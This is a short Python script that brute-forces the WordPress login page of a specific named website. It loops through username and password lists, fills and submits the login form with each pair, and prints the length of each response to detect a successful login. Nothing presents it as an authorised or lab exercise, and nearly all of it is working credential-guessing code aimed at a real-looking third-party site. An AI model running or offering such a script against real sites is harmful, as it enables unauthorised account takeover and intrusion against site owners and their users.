import requests
from loginform import fill_login_form



# The link of the website
# url = input("\nEnter URL:")
url = "http://leafus.com.ua/wp-login.php"

passwords = open('assets/passwords.txt').readlines()
users = open('assets/users.txt').readlines()

print(f"Connecting to: {url}......\n")
failed_aftertry = 0
for user in users:
    for password in passwords:

        # get html of the page and retreive POST DATA (login, password fields, hidden fields, post url)
        r = requests.get(url)
        fillings = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))

        # POST URL
        print(f"trying {user}: {password}")
        payload = dict(fillings[:-2][0])
        post_url = fillings[-2:-1][0]
        method = fillings[-1:][0]

        if method == "POST":
            with requests.Session() as s:
                res = requests.get(url)
                cookies = dict(res.cookies)
                p = s.post(post_url, data=payload, cookies=cookies)
                print(len(p.text))
                # print(p.content)\
        elif method == "GET":
            print('get method form')
        else:
            print('no method found')


Just_to_pause_the_script = input("\n.")
